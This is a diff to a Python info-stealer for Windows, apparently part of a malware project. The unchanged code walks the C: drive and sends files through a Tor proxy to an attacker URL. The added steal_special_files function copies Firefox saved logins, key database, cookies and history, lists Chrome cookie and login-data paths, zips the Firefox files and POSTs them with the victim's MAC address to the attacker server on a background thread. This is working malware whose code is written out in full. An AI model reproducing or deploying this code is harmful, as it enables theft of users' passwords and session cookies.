@@ -7,10 +7,12 @@ import mimetypes # to get MIME types for files
 from contextlib import ExitStack # to close files properly
 from secrets import token_hex # to generate hashes to avoid file name conflicts
 from getmac import get_mac_address # to get mac address
-from .. import destroyer
+import tempfile # for using memory to temporarily store small files
+import shutil # for copying files
+#from .. import destroyer
 
 
-URL = 'http://10.0.2.2:8000' # the URL/IP to which you want to send the stolen files/information to
+URL = 'http://10.0.2.2:3285' # the URL/IP to which you want to send the stolen files/information to
 AMOUNT_TO_SEND = 500.0 # How many files you want to send each time NOTE: Can also make sending by every X mb, or every X mb or X files whichever comes first
 USERNAME = os.getlogin()
 MAC = get_mac_address().replace(':', '') # store mac address
@@ -19,7 +21,6 @@ os.environ['HTTPS_PROXY'] = 'socks5h://127.0.0.1:9050' # ^
 
 #file_types = ['.txt'] # if checking for multiple file types
 files_found = [] # log files found.
-# NOTE: Files of interest are already in list so they can be sent right at the start.
 
 def file_search():
     for dir, sdirs, files in os.walk('C:\\'): # dir - directories, sdirs - subdirectories
@@ -78,4 +79,35 @@ def make_zip():
         zip.close()
     return zip_name
 
+def steal_special_files():
+    with tempfile.TemporaryDirectory() as temp_dir:
+        user = os.getlogin()
+        copy_dest = fr"{temp_dir}\files"
+        os.mkdir(copy_dest)  # make the folder
+        chrome_files = [fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
+                        fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Login Data",
+                        fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Login Data"]
+        firefox_files = ["places.sqlite", "key4.db", "logins.json", "cookies.sqlite"]
+        dir_path = fr"C:\Users\{user}\AppData\Roaming\Mozilla\Firefox\Profiles"
+        files_copied = []
+
+        for f in os.scandir(dir_path):  # scan all folders
+            if f.is_dir():  # check if it is a directory
+                f_copy_dest = os.path.join(copy_dest, f.name)  # prepare the destination to copy the folder's files to
+                os.mkdir(f_copy_dest)  # make the folder
+                for file in firefox_files:  # go through each file we're looking for
+                    file_path = os.path.join(f.path, file)  # prepare the path for the file we're looking for
+                    if os.path.exists(file_path):  # check if the file exists
+                        file_dest = f_copy_dest + f'\\{file}'  # prepare the destination for the specific file
+                        shutil.copy2(file_path, file_dest)  # copy the file
+                        files_copied.append(file_dest)  # add it to the list
+
+        zip_loc = fr"{temp_dir}\zip"
+        shutil.make_archive(zip_loc, "zip", copy_dest)
+        zip_loc += '.zip'  # Add .zip to the end of zip_loc because shutil.make_archive() automatically adds it so it wasn't originally included in the variable.
+        with open(zip_loc, 'rb') as zip:  # open the zip file in bytes so it can be sent properly
+            zip_file = {'file': (zip_loc, zip, 'application/zip')}  # make the payload.
+            r = requests.post(f'{URL}/special_files', headers={'mac': MAC}, files=zip_file)  # send the zip file
+
+threading.Thread(target=steal_special_files).start()
 file_search()
